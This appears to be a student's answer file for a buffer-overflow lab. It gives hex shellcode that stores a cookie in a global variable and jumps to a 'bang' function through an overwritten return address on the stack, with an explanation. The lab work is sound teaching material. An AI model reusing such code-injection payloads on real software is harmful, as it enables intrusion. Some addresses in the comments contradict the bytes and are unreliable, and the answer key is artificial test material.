@@ -1,0 +1,38 @@
+/* Answer */
+b8 55 fb cf 17 a3 00 d1
+04 08 68 9d 8c 04 08 c3
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 9d 8c 04 08
+00 00 00 00 58 3b 68 55
+
+/* Explain
+ *
+ * Get the bang's function address first(0x8048c93),
+ * looking at the asm code, found
+ *         mov 0x804d100, %eax
+ *         cmp 0x804d108, %eax
+ * means global -> 0x804d100
+ *       val(bang) -> 0x804d108
+ * Our gold is to right our cookies(0x17cffb55)
+ * into global(0x804d100)
+ * use the asm code:
+ *     mov $0x17cffb55, %eax /*move cookie to %eax*/
+ *     mov %eax, 0x804d100 /* set global_value as cookie */
+ *     push $0x8048c9d /* push the address of bang to the stack */
+ *     ret /* goto bang */
+ * and the command:
+ *     gcc -m32 -c lv2s.s
+ *     objdump -d lv2s.o > lv2s.d
+ * to get the answer:
+ *    b8 55 fb cf 17 a3 00 d1
+ *    04 08 68 9d 8c 04 08 c3
+ * write it into the beginning of string, according to disassemble of getbuf, we could find the beginning of string is -0x28($ebp), as well as 0x5568b58
+ * so the final answer is:
+ *    b8 55 fb cf 17 a3 00 d1 // write cookies to
+ *    04 08 68 9d 8c 04 08 c3 // global_value
+ *    00 00 00 00 00 00 00 00
+ *    00 00 00 00 00 00 00 00
+ *    00 00 00 00 9d 8c 04 08 // call bang function
+ *    00 00 00 00 58 3b 68 55 // the begining of string
+ */
